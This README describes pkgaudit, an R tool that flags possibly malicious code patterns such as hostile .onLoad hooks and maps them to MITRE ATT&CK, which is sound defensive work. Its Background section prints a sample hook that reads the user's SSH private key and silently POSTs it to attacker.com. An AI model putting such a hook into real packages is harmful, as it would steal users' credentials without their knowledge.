# pkgaudit

pkgaudit provides security-focused static code analysis for R. It searches R source code for possibly malicious patterns and, if found, returns the results with a clear explanation of the pattern and its relationship to the [MITRE ATT&CK](https://attack.mitre.org/) framework of adversary tactics and techniques.

## Background

### R is an attack surface

R packages are the primary mechanism for sharing R code. When you run `install.packages()` or `library()`, R executes code from the package automatically -- code you may never have read. A malicious or compromised package can run arbitrary code on your system the moment you install or load it, without any action beyond your normal R workflow.

This is not a theoretical risk. The same attack pattern has been documented repeatedly in other package ecosystems. In 2018, a malicious contributor to the JavaScript package `event-stream` on npm introduced code that stole cryptocurrency wallets. In 2024, the Python package `ultralytics` on PyPI was compromised to distribute a cryptominer to its users. 

R is an attack surface, but CRAN has received little systematic security scrutiny compared to other ecosystems, despite R's deep penetration in environments processing sensitive data: clinical trial analysis, government statistics, financial risk modeling, and academic research.

The initial release of pkgaudit focuses on **lifecycle hooks**, which are functions that R calls automatically during package loading. `.onLoad()` runs when a package's namespace is loaded, and `.onAttach()` runs when the package is attached to the search path -- both triggered by a call to `library()`. Any code inside these functions runs with the privileges of the user running R, before the user has any opportunity to review it.

A minimal example of what a malicious `.onLoad` hook might look like is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
```

This code reads the user's SSH private key and sends it to an external server whenever the package is loaded. The `tryCatch()` wrapper suppresses any errors, so the package loads normally and the user sees nothing unusual.

### What pkgaudit does

pkgaudit scans R packages, directories, or files against a SQLite database of possibly malicious code patterns. 

The patterns are defined using [XPath](https://en.wikipedia.org/wiki/XPath). R code is parsed by R's native `parse()`, then represented as XML by `xmlparsedata::xml_parse_data()` and `xml2::read_xml()`. The XPath patterns are found using `xml2::xml_find_all()`. 

This approach was inspired by the [lintr](https://lintr.r-lib.org/) package, which is widely used to enforce code style. pkgaudit imports a more limited set of dependencies and does not support `# nolint`, which would be an obvious evasion technique in adversarial contexts. 

Findings are mapped to the [MITRE ATT&CK](https://attack.mitre.org/) framework, the standard vocabulary for describing adversarial behavior, to help security teams integrate pkgaudit findings into their existing workflows.

### What pkgaudit does not do

`pkgaudit::audit_package()` currently scans the `R/` subdirectory only. Future versions will expand coverage to additional subdirectories, including `vignettes/` and `tests/`. `audit_dir()` and `audit_file()` can be used to scan other directories and files directly.

A pkgaudit finding does not necessarily mean that a package contains a malicious code. Rather, it indicates a security-relevant pattern that should be reviewed before running the code.

Static analysis also cannot detect all malicious code -- a determined attacker can obfuscate dangerous patterns beyond what any source-level tool can reliably identify. pkgaudit is just one layer of defense, not a complete solution.

## Installation

You can install pkgaudit as follows:

``` r
remotes::install_github("tylerjssmith/pkgaudit")
```

## Usage

A file may be scanned as follows:

``` r
library(pkgaudit)
rules    <- load_rules()
findings <- audit_package("path/to/package", rules = rules)

# Record the rules version for reproducibility
attr(findings, "rules_version") <- rules_version()
```




